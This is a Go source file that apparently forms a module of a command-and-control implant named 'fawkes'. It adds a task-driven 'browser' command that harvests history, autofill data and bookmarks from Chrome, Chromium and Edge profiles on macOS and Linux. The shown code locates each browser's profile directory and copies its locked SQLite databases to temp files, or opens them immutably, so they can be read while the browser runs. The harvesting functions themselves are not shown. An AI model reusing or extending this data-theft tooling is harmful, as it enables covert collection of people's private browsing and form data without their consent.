//go:build !windows

package commands

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"

	"fawkes/pkg/structs"
)

// BrowserCommand implements browser data harvesting on macOS and Linux.
// Supports history, autofill, and bookmarks from Chromium-based browsers.
// Passwords and cookies require platform-specific key management (DPAPI on Windows,
// Keychain on macOS) and are only supported on Windows.
type BrowserCommand struct{}

func (c *BrowserCommand) Name() string { return "browser" }
func (c *BrowserCommand) Description() string {
	return "Harvest history, autofill, and bookmarks from Chromium-based browsers"
}

func (c *BrowserCommand) Execute(task structs.Task) structs.CommandResult {
	var args browserArgs

	if task.Params != "" {
		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
			args.Action = "history"
			args.Browser = "all"
		}
	}

	if args.Action == "" {
		args.Action = "history"
	}
	if args.Browser == "" {
		args.Browser = "all"
	}

	switch strings.ToLower(args.Action) {
	case "history":
		return browserHistory(args)
	case "autofill":
		return browserAutofill(args)
	case "bookmarks":
		return browserBookmarks(args)
	case "passwords", "cookies":
		return errorf("Action '%s' requires DPAPI decryption and is only supported on Windows. Use 'history', 'autofill', or 'bookmarks' on %s.", args.Action, runtime.GOOS)
	default:
		return errorf("Unknown action: %s. Use: history, autofill, bookmarks (passwords/cookies are Windows-only)", args.Action)
	}
}

// browserPaths returns the User Data directories for supported Chromium-based browsers
// on macOS and Linux.
func browserPaths(browser string) map[string]string {
	home, err := os.UserHomeDir()
	if err != nil {
		return nil
	}

	var all map[string]string
	switch runtime.GOOS {
	case "darwin":
		all = map[string]string{
			"Chrome":   filepath.Join(home, "Library", "Application Support", "Google", "Chrome"),
			"Chromium": filepath.Join(home, "Library", "Application Support", "Chromium"),
			"Edge":     filepath.Join(home, "Library", "Application Support", "Microsoft Edge"),
		}
	case "linux":
		all = map[string]string{
			"Chrome":   filepath.Join(home, ".config", "google-chrome"),
			"Chromium": filepath.Join(home, ".config", "chromium"),
			"Edge":     filepath.Join(home, ".config", "microsoft-edge"),
		}
	default:
		return nil
	}

	switch strings.ToLower(browser) {
	case "chrome":
		result := make(map[string]string)
		if v, ok := all["Chrome"]; ok {
			result["Chrome"] = v
		}
		if v, ok := all["Chromium"]; ok {
			result["Chromium"] = v
		}
		return result
	case "edge":
		return map[string]string{"Edge": all["Edge"]}
	case "chromium":
		return map[string]string{"Chromium": all["Chromium"]}
	default:
		return all
	}
}

// openBrowserDB opens a Chromium SQLite database by copying it to a temp file first.
// On non-Windows, browser processes hold exclusive locks on their databases. Copying
// the file first avoids contention. Falls back to immutable mode if copy fails.
func openBrowserDB(dbPath string) (*sql.DB, func(), error) {
	// Strategy 1: Copy the DB to a temp file to avoid lock contention
	srcData, readErr := os.ReadFile(dbPath)
	if readErr == nil {
		tmpFile, tmpErr := os.CreateTemp("", "")
		if tmpErr == nil {
			tmpPath := tmpFile.Name()
			if _, writeErr := tmpFile.Write(srcData); writeErr == nil {
				tmpFile.Close()
				db, dbErr := sql.Open("sqlite", tmpPath)
				if dbErr == nil {
					cleanup := func() {
						db.Close()
						os.Remove(tmpPath)
					}
					return db, cleanup, nil
				}
			} else {
				tmpFile.Close()
			}
			os.Remove(tmpPath)
		}
	}

	// Strategy 2: Open in immutable mode (read-only, no locking)
	immutableURI := "file://" + dbPath + "?immutable=1"
	db, err := sql.Open("sqlite", immutableURI)
	if err != nil {
		return nil, func() {}, fmt.Errorf("open %s: %w", filepath.Base(dbPath), err)
	}
	cleanup := func() { db.Close() }
	return db, cleanup, nil
}
